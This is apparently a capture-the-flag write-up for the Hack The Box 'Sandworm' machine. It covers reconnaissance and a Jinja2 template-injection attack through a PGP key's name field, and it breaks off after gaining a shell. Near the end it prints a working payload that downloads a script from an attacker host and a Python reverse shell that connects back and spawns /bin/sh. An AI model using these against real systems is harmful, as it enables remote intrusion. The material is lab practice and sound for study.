# #1 Introduction
<img width="692" alt="image" src="https://github.com/Mate0r/app.hackthebock.com/assets/94843357/d90f6781-091a-411d-857d-83aac3e84515">

# #2 nmap

we first add a domain in /etc/hosts so we don't need to remember the IP
```bash
10.10.xx.xx sandworm.htb
```

we run an nmap scan as sudo so it's doing a SYN scan and not a full TCP connection so it's faster

```bash
sudo nmap -T4 -sV -p- sandworm.htb
```

we got these open ports
```bash
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# #3 user.txt

## HTTP (port 80)


about                   [Status: 200, Size: 5584, Words: 1147, Lines: 77, Duration: 211ms]
admin                   [Status: 302, Size: 227, Words: 18, Lines: 6, Duration: 81ms]
contact                 [Status: 200, Size: 3543, Words: 772, Lines: 69, Duration: 55ms]
guide                   [Status: 200, Size: 9043, Words: 1771, Lines: 155, Duration: 73ms]
login                   [Status: 200, Size: 4392, Words: 1374, Lines: 83, Duration: 78ms]
logout                  [Status: 302, Size: 229, Words: 18, Lines: 6, Duration: 71ms]
pgp                     [Status: 200, Size: 3187, Words: 9, Lines: 54, Duration: 110ms]
process                 [Status: 405, Size: 153, Words: 16, Lines: 6, Duration: 89ms]
view                    [Status: 302, Size: 225, Words: 18, Lines: 6, Duration: 110ms]


.gpg
.asc
.sig
.key



https://www.wired.co.uk/article/efail-pgp-vulnerability-outlook-thunderbird-smime

https://efail.de/

we can use a ssti (sever side template injection) by using the RealName of the public key generated and verifying signature of message\
by using {{ 7 * 7 }} for example, we can see that the code is executed cause we have a web template engine named jinja2 (in python)\

So to get a reverse shell, we can use this crafted payload:

{{self.__init__.__globals__.__builtins__.__import__('os').system('wget http://10.10.15.56:8000/shell.py -O /tmp/shell.py')}}

import socket,os,pty;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.15.56",6666));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
pty.spawn("/bin/sh");

